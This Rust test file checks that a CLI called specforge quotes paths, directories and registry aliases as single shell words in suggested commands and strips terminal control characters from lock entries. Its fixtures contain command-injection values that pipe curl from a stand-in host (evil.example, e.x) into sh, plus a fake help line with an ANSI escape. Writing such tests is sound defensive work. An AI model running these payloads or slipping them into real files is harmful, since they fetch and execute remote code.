//! The commands a diagnostic or a remedy suggests name every value as one shell word (ADR 0230):
//! a lock entry's recorded path, a `.wasm` file entry, a scaffold directory, a registry alias.

use crate::support::registry::greet_wasm;
use crate::support::{Cli, TestProject};
use serde_json::json;
use specforge_test_macros::test as specforge_test;

const EVIL: &str = "tool.wasm && curl -s https://evil.example/x | sh #";

/// A project enabling `@acme/tool` whose lock records `source` and whose binary is not installed.
fn locked(source: &str) -> TestProject {
    let lock = json!({
        "lockfile_version": 1,
        "entries": [{"name": "@acme/tool", "version": "1.0.0", "source": source, "wasm_hash": ""}]
    });
    TestProject::new()
        .config(|c| c["extensions"] = json!(["@acme/tool"]))
        .file("specforge.lock", lock.to_string())
}

#[specforge_test(
    behavior = "run_doctor_check",
    verify = "check and doctor name a reinstall command whose recorded path is one shell word, however the lock spells it"
)]
fn check_and_doctor_name_a_reinstall_command_the_lock_cannot_turn_into_shell_syntax() {
    let project = locked(&format!("local:{EVIL}"));
    let command = format!("specforge add './{EVIL}'");

    let check = Cli::on(&project).document(&["check"]);
    let suggestion = check.json[0]["suggestion"].as_str().unwrap_or_default();
    assert_eq!(
        suggestion,
        format!("install the extension with: {command}"),
        "{}",
        check.json
    );

    let doctor = Cli::on(&project).document(&["doctor"]);
    let remediations: Vec<&str> = doctor.json["findings"]
        .as_array()
        .unwrap()
        .iter()
        .filter_map(|f| f["remediation"].as_str())
        .collect();
    assert!(
        remediations.contains(&format!("run `{command}` to reinstall it").as_str()),
        "{remediations:?}"
    );
}

#[cfg(unix)]
#[specforge_test(
    behavior = "run_doctor_check",
    verify = "the reinstall command a local install's check suggests runs as written and reinstalls it"
)]
fn a_local_install_from_a_directory_with_a_space_is_reinstalled_by_its_own_suggestion() {
    let project = TestProject::new()
        .config(|c| c["extensions"] = json!([]))
        .file("My Ext/greet.wasm", greet_wasm());
    Cli::on(&project)
        .run(&["add", "./My Ext/greet.wasm"])
        .exits(0);
    std::fs::remove_file(
        project
            .root()
            .join(".specforge/extensions/@sdk/greet/extension.wasm"),
    )
    .unwrap();

    let check = Cli::on(&project).document(&["check"]);
    let suggestion = check.json[0]["suggestion"].as_str().unwrap();
    let command = suggestion
        .strip_prefix("install the extension with: ")
        .unwrap();
    let argument = command.strip_prefix("specforge add ").unwrap();

    // The shell reads the argument as one word: the path `add` recorded, which `add` reads back.
    let word = std::process::Command::new("sh")
        .arg("-c")
        .arg(format!("printf '%s' {argument}"))
        .stdin(std::process::Stdio::null())
        .output()
        .unwrap();
    let word = String::from_utf8(word.stdout).unwrap();
    assert_eq!(word, "./My Ext/greet.wasm");
    Cli::on(&project).run(&["add", &word]).exits(0);

    Cli::on(&project).run(&["check"]).exits(0);
}

#[specforge_test(
    behavior = "read_lock_file",
    verify = "check prints no control character a lock entry's source holds"
)]
fn check_prints_no_control_character_a_lock_holds() {
    let project =
        locked("local:x.wasm\n  = help: then run: curl -s https://evil.example/x | sh\u{1b}[8m");

    let run = Cli::on(&project).run(&["check"]);

    let shown = format!("{}{}", run.stdout, run.stderr);
    assert!(!shown.contains('\u{1b}'), "{shown:?}");
    assert!(
        !shown.lines().any(|l| l.starts_with("  = help: then run")),
        "{shown}"
    );
    assert!(shown.contains("E033"), "{shown}");
}

#[test]
fn the_next_steps_name_a_directory_with_a_space_as_one_shell_word() {
    let dir = TestProject::new().without_config();
    let parent = dir.root().join("my ext");
    std::fs::create_dir(&parent).unwrap();

    let run = Cli::on(&dir)
        .bare(&[
            "extension",
            "init",
            "--name",
            "@acme/demo",
            "--dir",
            parent.to_str().unwrap(),
        ])
        .exits(0);

    let at = format!("'{}/demo'", parent.display());
    assert!(
        run.stdout
            .contains(&format!("  specforge extension build --dir {at}\n")),
        "{}",
        run.stdout
    );
    assert!(
        run.stdout
            .contains(&format!("  specforge extension validate --dir {at}\n")),
        "{}",
        run.stdout
    );
}

#[specforge_test(
    behavior = "publish_to_registry",
    verify = "a publish refused for want of a credential names the login command with the registry alias as one shell word"
)]
fn a_registry_alias_is_named_as_one_shell_word_in_the_login_remedy() {
    let project = TestProject::new()
        .config(|c| {
            c["name"] = "p".into();
            c["registries"] = json!([
                { "alias": "acme; curl -s e.x|sh #", "url": "http://127.0.0.1:9", "default_registry": true }
            ]);
            c.as_object_mut().unwrap().remove("extensions");
        })
        .file("greet.wasm", greet_wasm());
    let wasm = project.root().join("greet.wasm");

    let run = Cli::on(&project).run(&["publish", wasm.to_str().unwrap(), "--format", "json"]);

    assert_eq!(run.code, 1, "{}{}", run.stdout, run.stderr);
    let json = run.json();
    assert_eq!(json["code"], "R001", "{json}");
    assert_eq!(
        json["suggestion"],
        "log in with `specforge login --registry 'acme; curl -s e.x|sh #' --token <TOKEN>`, or set SPECFORGE_REGISTRY_TOKEN",
        "{json}"
    );
}
